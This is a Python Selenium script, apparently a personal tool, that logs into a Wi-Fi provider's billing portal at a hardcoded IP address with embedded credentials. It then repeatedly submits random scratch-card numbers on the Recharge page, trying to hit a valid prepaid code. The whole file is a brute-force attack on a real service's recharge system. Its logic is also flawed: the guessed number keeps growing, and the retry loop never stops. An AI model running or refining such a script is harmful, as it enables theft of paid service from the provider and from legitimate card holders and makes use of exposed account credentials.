import random
import requests
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from bs4 import BeautifulSoup




class Wifi:

    url = ""
    text = ""
    driver = ""
    finalScratchNumber = ""
    rechargePageUrl = ""

    letters = ['A','B','C','D','E','0','1','2','3','4','5','6','7','8','9']


    def SCRATCH_NUMBER_GENERATOR(self):

        for number in range(10):
            self.finalScratchNumber += random.choice(self.letters)

        return self.finalScratchNumber

    

    def AUTOFILL_CREDENTIAL(self):

        path = "C:\Program Files (x86)\chromedriver.exe"
        self.driver = webdriver.Chrome(path)

        self.driver.get("http://119.148.40.171")


        # fillup username, password and click Login button 
        username = self.driver.find_element_by_name("username").send_keys("pn1629")
        password = self.driver.find_element_by_name("password").send_keys("pn1629")
        self.driver.find_element_by_class_name("login100-form-btn").click()


        # go to Recharge Page
        self.driver.find_element_by_link_text("Recharge").click()
        # self.driver.get("http://119.148.40.171/armyris/recharge-account.php")


        # create random number and click on Recharge button
        self.driver.find_element_by_name("card_no").send_keys(self.SCRATCH_NUMBER_GENERATOR())
        self.driver.find_element_by_css_selector("input[value=Recharge]").click()


        # get current url and request to get html code
        self.url = self.driver.current_url
        r = requests.get(self.url)
        htmlContent = r.content


        # get only text from html 
        soup = BeautifulSoup(htmlContent, "html.parser")
        self.text = soup.get_text()
        
        # return self.text
        print(self.text)
    

    # loop until Card number get valid
    def INVALID_CARD(self):

        if "Card number is invalid." in self.text:

            while True:
                self.driver.find_element_by_name("card_no").send_keys(self.SCRATCH_NUMBER_GENERATOR())
                self.driver.find_element_by_css_selector("input[value=Recharge]").click()

        # print(self.text)

    
    # Control all Function
    def MAIN_FUNCTION(self):

        self.AUTOFILL_CREDENTIAL()
        self.INVALID_CARD()



        
m = Wifi()
print(m.MAIN_FUNCTION())
print(m.AUTOFILL_CREDENTIAL())
